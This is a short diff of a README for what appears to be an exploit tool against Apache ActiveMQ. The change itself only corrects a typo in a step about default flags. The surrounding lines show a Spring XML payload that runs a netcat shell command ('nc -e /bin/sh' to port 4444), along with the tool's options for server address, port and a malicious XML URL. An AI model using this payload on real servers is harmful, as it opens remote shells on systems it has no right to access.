@@ -21,7 +21,7 @@ https://www.techbeginner.in/2019/12/how-to-install-apache-activemq-on-ubuntu-16-
                 <value>sh</value>
                 <value>-c</value>
                 <value>nc -e /bin/sh <target_ip> 4444</value>
-6. Check the values the default values. You don't need to review it:
+6. Check the default values. You don't need to review it:
 	- flag.StringVar(&ip, "i", "", "ActiveMQ Server IP or Host")
 	- flag.StringVar(&port, "p", "61616", "ActiveMQ Server Port")
 	- flag.StringVar(&url, "u", "", "Spring XML Url")\n
